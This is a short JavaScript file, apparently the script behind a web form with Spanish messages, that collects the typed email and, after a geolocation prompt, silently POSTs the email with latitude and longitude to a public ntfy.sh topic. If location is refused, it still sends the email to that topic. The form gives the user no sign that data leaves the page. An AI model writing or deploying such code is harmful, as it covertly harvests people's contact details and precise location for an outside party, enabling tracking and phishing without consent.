let pos = {}
let submiteateste = (event) => {
    event.preventDefault();
    let id = document.getElementById('email').value
    if (id.length > 6) {
        obtenerUbicacion()
    }
}
function obtenerUbicacion() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(mostrarPosicion, mostrarError);
    } else {
        alert("Tu navegador no soporta la geolocalización.");
    }
}

function mostrarPosicion(posicion) {
    var latitud = posicion.coords.latitude;
    var longitud = posicion.coords.longitude;
    pos = { latitude: latitud, longitude: longitud, id: document.getElementById('email').value }
    msg = JSON.stringify(pos)
    fetch('https://ntfy.sh/xrpw_alery', {
        method: 'POST',
        body: msg
    })
    document.getElementById('email').value = ''

}
function mostrarError(error) {
    switch (error.code) {
        case error.PERMISSION_DENIED:
            alert("El usuario denegó la solicitud de geolocalización.");
            msg = JSON.stringify(document.getElementById('email').value)
            fetch('https://ntfy.sh/xrpw_alery', {
                method: 'POST',
                body: msg
            })
            document.getElementById('email').value = ''

            break;
        case error.POSITION_UNAVAILABLE:
            alert("La información de ubicación no está disponible.");
            break;
        case error.TIMEOUT:
            alert("Se ha agotado el tiempo para obtener la ubicación.");
            break;
        case error.UNKNOWN_ERROR:
            alert("Ocurrió un error desconocido al obtener la ubicación.");
            break;
    }
}

